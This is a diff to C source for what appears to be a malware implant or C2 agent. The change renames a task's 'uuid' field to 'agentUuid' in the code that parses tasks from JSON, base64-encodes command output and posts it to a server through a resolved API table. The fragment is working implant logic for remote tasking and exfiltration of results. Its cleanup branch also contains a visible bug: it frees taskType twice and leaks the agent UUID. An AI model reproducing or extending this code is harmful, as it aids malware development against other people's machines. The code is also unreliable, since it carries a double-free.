@@ -354,7 +354,7 @@ typedef struct Task_
     CHAR* taskId;
     CHAR* taskParams;
     CHAR* taskType;
-    CHAR* uuid;
+    CHAR* agentUuid;
 } Task, *PTask;
 
 /*
@@ -511,7 +511,7 @@ Task readJsonTask(PAPI api, CHAR* json)
     trimmedToken1 = myTrim(api, token, ' ');
     trimmedToken2 = myEndTrim(api, trimmedToken1, ',');
     // remove the double quotes
-    task.uuid = myTrim(api, trimmedToken2, '"');
+    task.agentUuid = myTrim(api, trimmedToken2, '"');
 
     ((FREE)api->free)(trimmedToken1);
     trimmedToken1 = NULL;
@@ -735,9 +735,9 @@ void myMain()
             const DWORD dwEncodedExitOutputSize = 17;
             // base64 value of exitSuccess
             CHAR encodedExitOutput[17] = { 'R', 'X', 'h', 'p', 'd', 'F', 'N', '1', 'Y', '2', 'N', 'l', 'c', '3', 'M', '=', 0 };
-            totalJsonSize = myStrlenA(jsonFormat)-6 + dwEncodedExitOutputSize-1 + myStrlenA(task.taskId) + myStrlenA(task.uuid) + 16;
+            totalJsonSize = myStrlenA(jsonFormat)-6 + dwEncodedExitOutputSize-1 + myStrlenA(task.taskId) + myStrlenA(task.agentUuid) + 16;
             json = (CHAR*)((CALLOC)api->calloc)(totalJsonSize, sizeof(CHAR));
-            ((SNPRINTF)api->snprintf)(json, totalJsonSize, jsonFormat, task.taskId, task.uuid, encodedExitOutput);
+            ((SNPRINTF)api->snprintf)(json, totalJsonSize, jsonFormat, task.taskId, task.agentUuid, encodedExitOutput);
             PostRequest(api, wServer, port, pathSendTaskOutput, json);
 
             if (pEsgStdDll->pBuffer)
@@ -779,13 +779,14 @@ void myMain()
         ((CRYPTBINARYTOSTRINGA)api->CryptBinaryToStringA)((BYTE*)taskOutput, myStrlenA(taskOutput)+1, CRYPT_STRING_BASE64+CRYPT_STRING_NOCRLF, b64EncodedOutput, &b64EncodedOutputSize);
 
         // calculate the final json size
-        totalJsonSize = myStrlenA(jsonFormat)-6 + b64EncodedOutputSize + myStrlenA(task.taskId) + myStrlenA(task.uuid) + 16;
+        totalJsonSize = myStrlenA(jsonFormat)-6 + b64EncodedOutputSize + myStrlenA(task.taskId) + myStrlenA(task.agentUuid) + 16;
         // allocate memory for the final json
         json = (CHAR*)((CALLOC)api->calloc)(totalJsonSize, sizeof(CHAR));
         // fill the jsonFormat with relevant values
-        ((SNPRINTF)api->snprintf)(json, totalJsonSize, jsonFormat, task.taskId, task.uuid, b64EncodedOutput);
+        ((SNPRINTF)api->snprintf)(json, totalJsonSize, jsonFormat, task.taskId, task.agentUuid, b64EncodedOutput);
         PostRequest(api, wServer, port, pathSendTaskOutput, json);
 
+        // NOTE: You don't need to check for null?
         if (task.taskId)
         {
             ((FREE)api->free)(task.taskId);
@@ -801,7 +802,7 @@ void myMain()
             ((FREE)api->free)(task.taskType);
             task.taskType = NULL;
         }
-        if (task.uuid)
+        if (task.agentUuid)
         {
             ((FREE)api->free)(task.taskType);
             task.taskType = NULL;
